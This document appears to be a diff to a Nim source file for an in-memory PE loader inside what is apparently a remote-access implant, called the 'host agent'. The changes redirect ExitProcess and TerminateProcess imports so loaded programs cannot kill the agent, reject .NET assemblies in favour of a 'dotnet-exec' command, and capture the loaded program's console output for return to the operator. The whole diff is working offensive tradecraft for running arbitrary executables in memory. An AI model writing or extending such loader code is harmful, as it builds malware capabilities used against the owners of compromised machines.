@@ -11,6 +11,11 @@
 
 import winim/lean
 
+# ExitProcess redirect: standard EXE CRT startup calls ExitProcess on return,
+# killing the host agent.  Redirect IAT entry to ExitThread instead.
+proc fakeExitProcess(uExitCode: UINT) {.stdcall.} =
+  ExitThread(0)
+
 # ── Little-endian byte readers ────────────────────────────────────────────────
 
 proc u16le(d: seq[byte]; o: int): uint16 {.inline.} =
@@ -73,11 +78,20 @@ proc execPE*(pebytes: seq[byte]): string =
   let preferredBase = u64le(pebytes, optOff + 24)   # ImageBase
   let imgSz         = int(u32le(pebytes, optOff + 56))  # SizeOfImage
   var hdrSz         = int(u32le(pebytes, optOff + 60))  # SizeOfHeaders
+  let nDirs         = int(u32le(pebytes, optOff + 108)) # NumberOfRvaAndSizes
 
   # DataDirectory for PE32+ starts at optOff+112; entries are 8 bytes each.
   # [1] Import table  → base+8
   # [5] Base reloc    → base+40
+  # [14] COM/.NET    → base+112
   let ddBase = optOff + 112
+
+  # .NET detection: IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR = 14
+  if nDirs > 14 and ddBase + 14*8 + 8 <= pebytes.len:
+    let comVA = u32le(pebytes, ddBase + 14*8)
+    let comSz = u32le(pebytes, ddBase + 14*8 + 4)
+    if comVA != 0 and comSz != 0:
+      return "[error: .NET assembly — use dotnet-exec instead]"
   var impVA, impSz, relocVA, relocSz: uint32
   if ddBase + 16 <= pebytes.len:
     impVA = u32le(pebytes, ddBase + 8)
@@ -183,8 +197,11 @@ proc execPE*(pebytes: seq[byte]): string =
                    cast[cstring](int(thunk and 0xFFFF'u64))))
           else:
             # Named import: thunk is RVA to IMAGE_IMPORT_BY_NAME; skip 2-byte Hint
-            fn = cast[int](GetProcAddress(hDLL,
-                   cast[cstring](base + int(thunk) + 2)))
+            let fnName = cast[cstring](base + int(thunk) + 2)
+            fn = cast[int](GetProcAddress(hDLL, fnName))
+            # Intercept ExitProcess/TerminateProcess to prevent killing host agent
+            if fn != 0 and ($fnName == "ExitProcess" or $fnName == "TerminateProcess"):
+              fn = cast[int](fakeExitProcess)
           cast[ptr int](iatBase + j)[] = fn
           j += 8
       descOff += 20
@@ -196,16 +213,59 @@ proc execPE*(pebytes: seq[byte]): string =
     discard VirtualProtect(cast[LPVOID](base + int(s.va)),
                            SIZE_T(s.rawSz), peCharsToProt(s.chars), addr old)
 
-  # ── Phase 7: Execute entry point ──────────────────────────────────────────
+  # ── Phase 7: Redirect stdout/stderr, run entry point ─────────────────────
+  var pipeRead, pipeWrite: HANDLE
+  var sa: SECURITY_ATTRIBUTES
+  sa.nLength = DWORD(sizeof(sa))
+  sa.bInheritHandle = TRUE
+  let pipeOk = CreatePipe(addr pipeRead, addr pipeWrite, addr sa, 0) != 0
+  if pipeOk:
+    discard SetHandleInformation(pipeRead, HANDLE_FLAG_INHERIT, 0)
+
+  let oldStdout = GetStdHandle(STD_OUTPUT_HANDLE)
+  let oldStderr = GetStdHandle(STD_ERROR_HANDLE)
+  if pipeOk:
+    SetStdHandle(STD_OUTPUT_HANDLE, pipeWrite)
+    SetStdHandle(STD_ERROR_HANDLE, pipeWrite)
+
   var tid: DWORD
   let hThread = CreateThread(nil, 0,
     cast[LPTHREAD_START_ROUTINE](base + int(entryRVA)), nil, 0, addr tid)
+
   if hThread == 0:
+    if pipeOk:
+      SetStdHandle(STD_OUTPUT_HANDLE, oldStdout)
+      SetStdHandle(STD_ERROR_HANDLE, oldStderr)
+      discard CloseHandle(pipeWrite)
+      discard CloseHandle(pipeRead)
     return "[error: CreateThread failed (err " & $GetLastError() & ")]"
 
-  # Wait up to 10 s; if the PE keeps running (e.g. it's a payload), detach.
-  let r = WaitForSingleObject(hThread, 10000)
+  # Wait up to 30 s for the entry point to return
+  let r = WaitForSingleObject(hThread, 30000)
   discard CloseHandle(hThread)
+
+  if pipeOk:
+    SetStdHandle(STD_OUTPUT_HANDLE, oldStdout)
+    SetStdHandle(STD_ERROR_HANDLE, oldStderr)
+    discard CloseHandle(pipeWrite)
+
   if r == DWORD(0x00000102):   # WAIT_TIMEOUT
-    return "[+] PE executing (async — entry point did not return within 10 s)"
-  return "[+] PE executed and returned"
+    if pipeOk: discard CloseHandle(pipeRead)
+    return "[+] PE executing (async \xe2\x80\x94 entry point did not return within 30 s)"
+
+  # ── Phase 8: Collect captured output ─────────────────────────────────────
+  if not pipeOk:
+    return "[+] PE executed (output not captured)"
+
+  var output = ""
+  var buf: array[4096, char]
+  var rd: DWORD
+  while ReadFile(pipeRead, addr buf[0], DWORD(buf.len), addr rd, nil) != 0 and rd > 0:
+    var chunk = newString(int(rd))
+    copyMem(addr chunk[0], addr buf[0], int(rd))
+    output.add(chunk)
+  discard CloseHandle(pipeRead)
+
+  if output.len == 0:
+    return "[+] PE executed (no output)"
+  return output
